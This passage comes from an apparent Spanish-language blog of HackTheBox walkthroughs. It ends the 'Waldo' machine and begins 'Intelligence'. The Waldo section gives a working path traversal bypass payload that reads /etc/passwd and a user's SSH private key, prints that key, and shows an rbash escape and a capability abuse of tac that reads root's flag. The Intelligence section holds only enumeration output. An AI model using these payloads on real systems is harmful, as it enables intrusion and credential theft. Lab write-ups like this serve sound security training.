 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.87/list.html/FUZZ
Total requests: 87664

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

</span></code></pre></div></div>

<h2 id="path-traversal">PATH Traversal</h2>

<ul>
  <li>No encontramos nada, vamos a capturar con <code class="language-plaintext highlighter-rouge">Burpsuite</code> la petición de la pagina web <code class="language-plaintext highlighter-rouge">http://10.10.10.87/list.html</code> para ver como esta todo por detrás.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ burpsuite &amp;&gt;/dev/null &amp; <span class="nb">disown</span>
</code></pre></div></div>

<ul>
  <li>Si también capturamos peticiones cuando damos en add vemos rutas nuevas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/6.png" />
</p>

<ul>
  <li>
    <p>Vamos a capturar la petición al acceder a alguna lista.</p>
  </li>
  <li>
    <p>Vemos que apunta a otra ruta <code class="language-plaintext highlighter-rouge">.php</code> y vemos un <code class="language-plaintext highlighter-rouge">file=</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/7.png" />
</p>

<ul>
  <li>Vamos a enviar la petición y vemos el contenido de lo que hay dentro.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/8.png" />
</p>

<ul>
  <li>
    <p>Como tal tiene una estructura de directorios así que vamos a tratar de cargar el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> haciendo un <code class="language-plaintext highlighter-rouge">path traversal</code>.</p>
  </li>
  <li>
    <p>Pero nada.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/9.png" />
</p>

<ul>
  <li>Si aplicamos un pequeño Bypass vemos que funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/waldo/10.png" />
</p>

<ul>
  <li>Vemos al usuario nobody, operator y postgres con una sh.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://10.10.10.87/fileRead.php"</span> <span class="nt">-d</span> <span class="s1">'file=./.list/....//....//....//....//....//....//etc/passwd'</span> | jq <span class="s1">'.["file"]'</span> <span class="nt">-r</span> | <span class="nb">grep</span> <span class="s2">"sh$"</span>
root:x:0:0:root:/root:/bin/ash
operator:x:11:0:operator:/root:/bin/sh
postgres:x:70:70::/var/lib/postgresql:/bin/sh
nobody:x:65534:65534:nobody:/home/nobody:/bin/sh
</code></pre></div></div>

<ul>
  <li>Si enumeramos su directorio personal encontramos su clave privada dentro de la carpeta .ssh.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://10.10.10.87/fileRead.php"</span> <span class="nt">-d</span> <span class="s1">'file=./.list/....//....//....//....//....//....//home/nobody/.ssh/.monitor'</span> | jq <span class="s1">'.["file"]'</span> <span class="nt">-r</span>
<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl
mR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f
87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS
dGCc/gNpW/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN
o8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8/6pceowqs9ujRkNzH9T1lJq4Fx1V
vi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl/wdmuPEW6kU
vmzhRU3gcjuzwBET0TNejbL/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR/6
pKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5
8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q
1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox/05qoOBL4kQxUM7
VxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS
dVa3yLECgYEA7jk51MvUGSIFF6GkXsNb/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO
v0og0X/iROXAcp6Z9WGpIc6FhVgJd/4bNlTR+A/lWQwFt1b6l03xdsyaIyIWi9xr
xsb2sLNWP56A/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY
qFfdAWrvVZjp26Yf/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI
yzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1
/pAcw/+/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw/IMnLa3drm3CIAa32iU
LRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ/
lnN2n1WyTIyEuGA/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp
w7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9
1HLmBkDTjjj/xAJAZuiOF4Rs/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT
rj1BhUCzZCUgQABtpC6vYj/HLLlzpiC05AIEhDdvToPK/0WuY64fds0VccAYmMDr
X/PlAoGAS6UhbCm5TWZhtL/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2
DvVny8gKbM/OenwHnTlwRTEj5qdeAM40oj/mwCDc6kpV1lJXrW2R5mCH9zgbNFla
W0iKCBUAm5xZgU/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro<span class="o">=</span>
<span class="nt">-----END</span> RSA PRIVATE KEY-----
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nano id_rsa
❯ <span class="nb">chmod </span>600 id_rsa
</code></pre></div></div>

<h2 id="shell-as-nobody">Shell as nobody</h2>

<ul>
  <li>Ahora nos conectamos por ssh.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh <span class="nt">-i</span> id_rsa nobody@10.10.10.87
The authenticity of host <span class="s1">'10.10.10.87 (10.10.10.87)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:V+5vDo94JYcOMESxNxxs0je359eF2cxyHZS7vQtBQ1A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.10.87<span class="s1">' (ED25519) to the list of known hosts.
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;http://wiki.alpinelinux.org&gt;.
waldo:~$ whoami
nobody
waldo:~$ 
</span></code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Podemos ver la primer flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
cccbc59b1b8a9965f7eac3e8ebfa8529
waldo:~<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>No vemos nada interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
./usr/bin/passwd
./usr/bin/chage
./usr/bin/expiry
./usr/bin/chfn
./usr/bin/chsh
./usr/bin/newgrp
./usr/bin/gpasswd
waldo:/<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>El PATH que tenemos es muy pequeño así que vamos a exportar el de nosotros.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:/<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
waldo:/<span class="nv">$ </span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:/<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/miguelrega7/
.fzf/bin
waldo:/<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/miguelrega7/.fzf/bin
waldo:/<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Si nos vamos al directorio <code class="language-plaintext highlighter-rouge">.ssh</code> vemos que la clave le pertenece al usuario monitor.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:~/.ssh<span class="nv">$ </span><span class="nb">cat </span>authorized_keys <span class="p">;</span> <span class="nb">echo
</span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk3B/oKmWZHgkfqfg1xx2bVlT6oHvuWLxk6/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp/zuzQVkGFgCLMas014suEHUhkiOkNUlRtJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbBVeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+arOD6NJOFJY4jBHvf monitor@waldo
waldo:~/.ssh<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Si nos conectamos por SSH vemos que estamos en una <code class="language-plaintext highlighter-rouge">restricted bash</code> <a href="https://weblinus.com/como-restringir-la-shell-de-usuario-con-rbash/">https://weblinus.com/como-restringir-la-shell-de-usuario-con-rbash/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:~/.ssh<span class="nv">$ </span>ssh <span class="nt">-i</span> .monitor monitor@localhost
Linux waldo 4.19.0-25-amd64 <span class="c">#1 SMP Debian 4.19.289-2 (2023-08-08) x86_64</span>
           &amp;.                                                                  
          @@@,@@/ %                                                            
       <span class="c">#*/%@@@@/.&amp;@@,                                                          </span>
   @@@#@@#&amp;@#&amp;#&amp;@@@,<span class="k">*</span>%/                                                        
   /@@@&amp;###########@@&amp;<span class="k">*</span><span class="o">(</span><span class="k">*</span>                                                      
 <span class="o">(</span>@################%@@@@@.     /<span class="k">**</span>                                             
 @@@@&amp;#############%@@@@@@@@@@@@@@@@@@@@@@@@%<span class="o">((</span>/                               
 %@@@@%##########&amp;@@@....                 .#%#@@@@@@@#                         
 @@&amp;%#########@@@@/                        <span class="k">*</span>/@@@%<span class="o">(((</span>@@@%                       
    @@@#%@@%@@@,                       <span class="k">*</span>&amp;@@@&amp;%<span class="o">(((</span><span class="c">#((((@@(                      </span>
     /<span class="o">(</span>@@@@@@@                     <span class="k">*</span>&amp;@@@@%<span class="o">((((((((((((</span><span class="c">#@@(                     </span>
       %/#@@@/@ @#/@          ..@@@@%<span class="o">(((((((((((</span><span class="c">#((#@@@@@@@@@@@@&amp;#,            </span>
          %@<span class="k">*</span><span class="o">(</span>@#%@.,       /@@@@&amp;<span class="o">(((((((((((((((</span>&amp;@@@@@@&amp;#######%%@@@@#    &amp;    
        <span class="k">*</span>@@@@@#        .&amp;@@@#<span class="o">(((</span><span class="c">#(#((((((((#%@@@@@%###&amp;@@@@@@@@@&amp;%##&amp;@@@@@@/   </span>
       /@@          <span class="c">#@@@&amp;#(((((((((((#((@@@@@%%%%@@@@%#########%&amp;@@@@@@@@&amp;     </span>
      <span class="k">*</span>@@      <span class="k">*</span>%@@@@#<span class="o">((((((((((((((</span><span class="c">#@@@@@@@@@@%####%@@@@@@@@@@@@###&amp;@@@@@@@&amp;  </span>
      %@/ .&amp;%@@%#<span class="o">(((((((((((((((</span><span class="c">#@@@@@@@&amp;#####%@@@%#############%@@@&amp;%##&amp;@@/   </span>
      @@@@@@%<span class="o">(((((((((((</span><span class="c">##(((@@@@&amp;%####%@@@%#####&amp;@@@@@@@@@@@@@@@&amp;##&amp;@@@@@@@@@/</span>
     @@@&amp;<span class="o">(((</span><span class="c">#((((((((((((#@@@@@&amp;@@@@######@@@###################&amp;@@@&amp;#####%@@* </span>
     @@#<span class="o">(((((((((((((</span><span class="c">#@@@@%&amp;@@.,,.*@@@%#####@@@@@@@@@@@@@@@@@@@%####%@@@@@@@@@@</span>
     <span class="k">*</span>@@%<span class="o">((((((((</span><span class="c">#@@@@@@@%#&amp;@@,,.,,.&amp;@@@#####################%@@@@@@%######&amp;@@.</span>
       @@@#<span class="o">(</span><span class="c">#&amp;@@@@@&amp;##&amp;@@@&amp;#@@/,,,,,,,,@@@&amp;######&amp;@@@@@@@@&amp;&amp;%######%@@@@@@@@@@@</span>
        @@@@@@&amp;%&amp;@@@%#&amp;@%%@@@@/,,,,,,,,,,/@@@@@@@#/,,.<span class="k">*</span>&amp;@@%&amp;@@@@@@&amp;%#####%@@@@.
          .@@@###&amp;@@@%%@<span class="o">(</span>,,,%@&amp;,.,,,,,,,,,,,,,.<span class="k">*</span>&amp;@@@@&amp;<span class="o">(</span>,<span class="k">*</span>@&amp;#@%%@@@@@@@@@@@@<span class="k">*</span>   
            @@%##%@@/@@@%/@@@@@@@@@#,,,,.../@@@@@%#%&amp;@@@@<span class="o">(</span>&amp;@&amp;@&amp;@@@@<span class="o">(</span>           
            .@@&amp;##@@,,/@@@@&amp;<span class="o">(</span><span class="nb">.</span>  .&amp;@@@&amp;,,,.&amp;@@/         <span class="c">#@@%@@@@@&amp;@@@/          </span>
           <span class="k">*</span>@@@@@&amp;@@.<span class="k">*</span>@@@          %@@@<span class="k">*</span>,&amp;@@            <span class="k">*</span>@@@@@&amp;.#/,@/          
          <span class="k">*</span>@@&amp;<span class="k">*</span><span class="c">#@@@@@@@&amp;     #@(    .@@@@@@&amp;    ,@@@,    @@@@@(,@/@@           </span>
          <span class="k">*</span>@@/@#.#@@@@@/    %@@@,   .@@&amp;%@@@     &amp;@&amp;     @@<span class="k">*</span>@@<span class="k">*</span><span class="o">(</span>@@#            
           <span class="o">(</span>@@/@,,@@&amp;@@@            &amp;@@,,<span class="o">(</span>@@&amp;          .@@%/@@,@@              
             /@@@<span class="k">*</span>,@@,@@@<span class="k">*</span>         @@@,,,,,@@@@.     <span class="k">*</span>@@@%,@@<span class="k">**</span>@#              
               %@@.%@&amp;,<span class="o">(</span>@@@@,  /&amp;@@@@,,,,,,,%@@@@@@@@@@%,,<span class="k">*</span>@@,#@,              
                ,@@,&amp;@,,,,<span class="o">(</span>@@@@@@@<span class="o">(</span>,,,,,.,,,,,,,,<span class="k">**</span>,,,,,,.<span class="k">*</span>@/,&amp;@               
                 &amp;@,<span class="k">*</span>@@.,,,,,..,,,,&amp;@@%/<span class="k">**</span>/@@<span class="k">*</span>,,,,,&amp;<span class="o">(</span>.,,,.@@,,@@               
                 /@%,&amp;@/,,,,/@%,,,,,<span class="k">*</span>&amp;@@@@@#.,,,,,.@@@<span class="o">(</span>,,<span class="o">(</span>@@@@@<span class="o">(</span>               
                  @@<span class="k">*</span>,@@,,,#@@@&amp;<span class="k">*</span>..,,,,,,,,,,,,/@@@@,<span class="k">*</span><span class="o">(</span>,,&amp;@/#<span class="k">*</span>                 
                  <span class="k">*</span>@@@@@<span class="o">(</span>,,@<span class="k">*</span>,%@@@@@@@&amp;&amp;#%@@@@@@@/,,,,,,,@@                    
                       @@<span class="k">*</span>,,,,,,,,,.<span class="k">*</span>/<span class="o">(</span>//<span class="k">*</span>,..,,,,,,,,,,,&amp;@,                    
                        @@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                     
                        &amp;@&amp;,,,,,,,,,,,,,,,,,,,,,,,,,,,,&amp;@#                     
                         %@<span class="o">(</span>,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                      
                         ,@@,,,,,,,,@@@&amp;&amp;&amp;%&amp;@,,,,,..,,@@,                      
                          <span class="k">*</span>@@,,,,,,,.,<span class="k">****</span>,..,,,,,,,,&amp;@@                       
                           <span class="o">(</span>@<span class="o">(</span>,,,.,,,,,,,,,,,,,,.,,,/@@                        
                           .@@,,,,,,,,,,,,,...,,,,,,@@                         
                            ,@@@,,,,,,,,,,,,,,,,.<span class="o">(</span>@@@                          
                              %@@@@&amp;<span class="o">(</span>,,,,<span class="k">*</span><span class="o">(</span><span class="c">#&amp;@@@@@@,     </span>
                              
                            Here<span class="s1">'s Waldo, where'</span>s root?
Last login: Tue Dec  5 06:02:39 2023 from 127.0.0.1
<span class="nt">-rbash</span>: <span class="nb">alias</span>: <span class="nb">command </span>not found
monitor@waldo:~<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Bueno para salir simplemente hacemos lo siguiente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:~/.ssh<span class="nv">$ </span>ssh <span class="nt">-i</span> .monitor monitor@localhost bash
<span class="nb">whoami
</span>monitor
script /dev/null <span class="nt">-c</span> bash
Script started, file is /dev/null
monitor@waldo:~<span class="nv">$ </span>
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Ahora nuevamente exportamos nuestro PATH.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>monitor@waldo:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/miguelrega7/.fzf/bin
&lt;r/local/games:/usr/games:/home/miguelrega7/.fzf/bin
monitor@waldo:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
monitor@waldo:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
<span class="nb">echo</span> <span class="nv">$PATH</span>
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/miguelrega7/.fzf/bin
monitor@waldo:~<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Si enumeramos por <code class="language-plaintext highlighter-rouge">capabilities</code> encontramos la siguiente tac <a href="https://gtfobins.github.io/gtfobins/tac/">https://gtfobins.github.io/gtfobins/tac/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>monitor@waldo:/home/nobody<span class="nv">$ </span>getcap <span class="nt">-r</span> / 2&gt;/dev/null
getcap <span class="nt">-r</span> / 2&gt;/dev/null
/bin/ping <span class="o">=</span> cap_net_raw+ep
/usr/bin/tac <span class="o">=</span> cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 <span class="o">=</span> cap_dac_read_search+ei
</code></pre></div></div>

<ul>
  <li>Bueno con eso podemos leer cualquier archivo privilegiado del sistema.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>monitor@waldo:/home/nobody<span class="nv">$ </span><span class="nb">tac</span> /root/root.txt
7f680a52657f6c1ee72752e7ab096955
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Intelligence (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/08/12/intelligence.html" rel="alternate" type="text/html" title="HackTheBox - Intelligence (medium)" /><published>2024-08-12T00:00:00-06:00</published><updated>2024-08-12T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/08/12/intelligence</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/08/12/intelligence.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/78c5d8511bae13864c72ba8df1329e8d.png" />
</p>

<ul>
  <li>Intelligence is a medium difficulty Windows machine that showcases a number of common attacks in an Active Directory environment. After retrieving internal PDF documents stored on the web server (by brute-forcing a common naming scheme) and inspecting their contents and metadata, which reveal a default password and a list of potential AD users, password spraying leads to the discovery of a valid user account, granting initial foothold on the system. A scheduled PowerShell script that sends authenticated requests to web servers based on their hostname is discovered; by adding a custom DNS record, it is possible to force a request that can be intercepted to capture the hash of a second user, which is easily crackable. This user is allowed to read the password of a group managed service account, which in turn has constrained delegation access to the domain controller, resulting in a shell with administrative privileges.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49669,49691,49692,49696,49713,50192 10.10.10.248 <span class="nt">-oN</span> targeted
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguelrega7: 
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-08-05 18:48 CST
Nmap scan report <span class="k">for </span>10.10.10.248
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Intelligence
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-08-06 07:48:52Z<span class="o">)</span>
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49669/tcp filtered unknown
49691/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open     msrpc         Microsoft Windows RPC
49696/tcp filtered unknown
49713/tcp filtered unknown
50192/tcp filtered unknown
Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   <span class="nb">date</span>: 2024-08-06T07:49:43
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m58s
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.248
SMB         10.10.10.248    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:intelligence.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar los nombres de dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.10.248 dc.intelligence.htb intelligence.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.10.248 dc.intelligence.htb intelligence.htb
</code></pre></div></div>

<ul>
  <li>No podemos enumerar por <code class="language-plaintext highlighter-rouge">smb</code> con <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.248 <span class="nt">-u</span> <span class="s2">"miguel"</span> <span class="nt">-p</span> <span class="s2">""</span> <span class="nt">--shares</span>
SMB         10.10.10.248    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:intelligence.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\m</span>iguel: STATUS_LOGON_FAILURE 
</code></pre></div></div>

<ul>
  <li>Si probamos otra herramienta vemos que no nos reporta ningún recurso compartido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.248 <span class="nt">-N</span>
Anonymous login successful

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
do_connect: Connection to 10.10.10.248 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.248 <span class="nt">--no-banner</span>
<span class="o">[</span><span class="se">\]</span> Checking <span class="k">for </span>open ports...                                                                                                  <span class="o">[</span>|] Checking <span class="k">for </span>open ports...                                                                                                  <span class="o">[</span>/] Checking <span class="k">for </span>open ports...                                                                                                  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB connections<span class="o">(</span>s<span class="o">)</span> and 0 authenticated session<span class="o">(</span>s<span class="o">)</span>                                                          
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closed 1 connections        
</code></pre></div></div>

<ul>
  <li>Si intentamos enumerar por el protocolo RPC no nos deja.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> 10.10.10.248
rpcclient <span class="nv">$&gt;</span> enumdomusers
result was NT_STATUS_ACCESS_DENIED
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/1.png" />
</p>

<ul>
  <li>Estas son las tecnologías que esta usando.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.248</span>
